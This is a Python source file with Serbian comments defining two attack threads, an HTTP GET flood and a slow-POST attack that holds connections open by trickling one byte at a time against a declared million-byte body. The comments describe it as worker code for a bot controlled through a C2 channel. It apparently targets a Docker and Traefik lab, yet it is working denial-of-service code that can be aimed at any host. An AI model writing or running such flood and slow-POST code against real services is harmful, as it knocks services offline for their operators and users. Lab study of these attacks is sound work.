# telo napadackih niti. prima samo parametre koji su joj potrebni da izvrsi svoj posao
# bot.py odlucuje kolko ovakvih niti pokrenuti 
import requests  # sam sastavlja zahtev
import socket

def run_http_flood(target_host, rate, stop_event, stats): # sve ce ih slati bot.py kroz komunikaciju sa c2

    while not stop_event.is_set(): # vrti dok bot.py ne postavi
        try:
            response = requests.get( # dovoljno je da se izvrsi bez greske
                "http://host.docker.internal/", # resolveuje se unutar docker kontejnera kao ip host masine  
                headers={"Host": target_host}, # traefik na osnovu ovoga odlucuje kom servisu salje zahtev
                timeout=2 # ako dog ne stigne za 2 sek requests sam baci gresku                        
            )
            stats["requests_sent"] += 1     
        except requests.exceptions.RequestException:
            stats["requests_failed"] += 1

        stop_event.wait(1 / rate) # blokira nit na ovo vreme ili do kad neko ne pozove .set()


def run_slowpost(target_host, interval, stop_event, stats): # interval cekanja

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # koristi ipv4 i tcp
    sock.settimeout(5) # max vreme cekanja za bilo koju sl operaciju ( connect(), send().. )
    connected = False

    try:
        sock.connect(("host.docker.internal", 80)) # 3wh
        headers = (
            f"POST /api/upload HTTP/1.1\r\n"
            f"Host: {target_host}\r\n"
            f"Content-Length: 1000000\r\n"
            f"Content-Type: application/octet-stream\r\n"
            f"\r\n"
        ) 
        sock.send(headers.encode())
        stats["active_connections"] += 1

        connected = True
        while not stop_event.wait(interval): # wait vraca true ako je event setovan
            sock.send(b"a") # jedan bajt tela - Content-Length kaze da stize 1000000, nikad ne stigne na vreme

    except OSError:
        pass

    finally:
        if connected:
            stats["active_connections"] -= 1
        sock.close()